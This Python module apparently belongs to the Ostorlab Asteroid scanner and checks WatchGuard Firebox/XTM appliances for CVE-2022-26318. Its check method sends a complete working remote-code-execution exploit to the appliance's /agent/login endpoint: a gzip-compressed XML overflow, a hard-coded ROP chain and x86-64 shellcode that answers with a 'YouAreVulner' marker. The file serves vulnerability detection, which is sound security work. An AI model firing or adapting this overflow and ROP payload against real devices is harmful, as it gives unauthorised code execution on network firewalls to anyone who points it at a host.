"""Agent Asteroid implementation for CVE-2022_26318"""
import gzip

import requests
from ostorlab.agent.kb import kb
from ostorlab.agent.mixins import agent_report_vulnerability_mixin
from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry

VULNERABILITY_TITLE = "WatchGuard Firebox and XTM Appliances Arbitrary Code Execution"
VULNERABILITY_REFERENCE = "CVE-2022-26318"
VULNERABILITY_DESCRIPTION = (
    "On WatchGuard Firebox and XTM appliances, an unauthenticated user can execute"
    " arbitrary code, aka FBX-22786. This vulnerability impacts Fireware OS before 12.7.2_U2,"
    " 12.x before 12.1.3_U8, and 12.2.x through 12.5.x before 12.5.9_U2."
)

DEFAULT_TIMEOUT = 90
MAX_REDIRECTS = 2


@exploits_registry.register
class CVE202226318Exploit(definitions.Exploit):
    """
    CVE-2022_26318": WatchGuard Firebox and XTM Appliances Arbitrary Code Execution
    """

    def accept(self, target: definitions.Target) -> bool:
        session = requests.Session()
        session.max_redirects = MAX_REDIRECTS
        session.verify = False
        target_uri = f"{target.scheme}://{target.host}:{target.port}"
        try:
            session.get(target_uri + "/agent/login", timeout=DEFAULT_TIMEOUT)
        except requests_exceptions.RequestException:
            return False
        return True

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        session = requests.Session()
        session.max_redirects = MAX_REDIRECTS
        session.verify = False
        target_uri = f"{target.scheme}://{target.host}:{target.port}"
        payload = self._build_payload()
        headers = {
            "Content-Encoding": "gzip",
        }
        try:
            response = session.post(
                target_uri + "/agent/login",
                headers=headers,
                data=payload,
                timeout=DEFAULT_TIMEOUT,
            )
        except requests_exceptions.RequestException:
            return []

        if b"YouAreVulner" in response.content:
            vulnerability = self._create_vulnerability(target)
            return [vulnerability]
        else:
            return []

    def _build_payload(self) -> bytes:
        # xml overflow payload
        payload = b""
        payload += b"<methodCall><methodName>agent.login</methodName><params><param><value><struct><member><value><"
        payload += b"A" * 3181
        payload += b"MFA>"
        payload += b"<BBBBMFA>" * 3680

        # padding and rop chain
        payload += (
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 "
            b"P@\x00\x00\x00\x00\x00h\xf9@\x00\x00\x00\x00\x00 P@\x00\x00\x00"
            b"\x00\x00\x00\x00\x0e\xd6A\x00\x00\x00\x00\x00\xb1\xd5A\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00}^@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00|^@\x00\x00\x00\x00\x00\xad\xd2A\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x0e\xd6A\x00\x00\x00\x00\x00\xc0\x00\x00\x00"
            b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            b"\x00\x00\x00\x00\x00*\xa9@\x00\x00\x00\x00\x00"
        )

        # shell code
        payload += b"\x48\xC7\xC2\x30\x00\x00\x00"  # mov rdx,0x30
        payload += b"\x48\x89\xE6"  # mov rsi,rsp
        payload += b"\x48\x83\xC6\x2e"  # add rsi,0x2e
        payload += b"\x48\xC7\xC7\x09\x00\x00\x00"  # mov rdi,0x9
        payload += b"\x48\xC7\xC0\x01\x00\x00\x00"  # mov rax,0x1
        payload += b"\x0f\x05"  # syscall
        payload += b"\x48\xc7\xc0\x3c\x00\x00\x00"  # mov rax,0x3c
        payload += b"\x48\xc7\xc7\x00\x00\x00\x00"  # mov rdi,0x0
        payload += b"\x0f\x05"  # syscall

        # http response
        payload += b"\x01"  # fcgi version
        payload += b"\x06"  # fcgi type (stdout)
        payload += b"\x00\x01"  # fcgi request id
        payload += b"\x00\x3c"  # content length
        payload += b"\x00"  # padding length
        payload += b"\x00"  # reserved
        payload += b"Content-Type: text/plain\r\n\r\nYouAreVulner"

        return gzip.compress(payload, 9)

    def _create_vulnerability(
        self, target: definitions.Target
    ) -> definitions.Vulnerability:
        entry = kb.Entry(
            title=VULNERABILITY_TITLE,
            risk_rating="CRITICAL",
            short_description=VULNERABILITY_DESCRIPTION,
            description=VULNERABILITY_DESCRIPTION,
            references={
                "nvd.nist.gov": f"https://nvd.nist.gov/vuln/detail/{VULNERABILITY_REFERENCE}",
                "blog.assetnote.io": "https://blog.assetnote.io/2022/04/13/watchguard-firebox-rce/",
                "watchguard.com": "https://www.watchguard.com/support/release-notes/fireware/12/en-US/"
                "EN_ReleaseNotes_Fireware_12_7_2/index.html#Fireware/en-US/resolved_issues.html",
            },
            recommendation=(
                "- Make sure to install the latest security patches from software vendor \n"
                "- Update to the latest software version"
            ),
            security_issue=True,
            privacy_issue=False,
            has_public_exploit=True,
            targeted_by_malware=True,
            targeted_by_ransomware=True,
            targeted_by_nation_state=True,
        )
        technical_detail = (
            f"{target.scheme}://{target.host}:{target.port} is vulnerable to {VULNERABILITY_REFERENCE}, "
            f"{VULNERABILITY_TITLE}"
        )
        vulnerability = definitions.Vulnerability(
            entry=entry,
            technical_detail=technical_detail,
            risk_rating=agent_report_vulnerability_mixin.RiskRating.CRITICAL,
        )
        return vulnerability
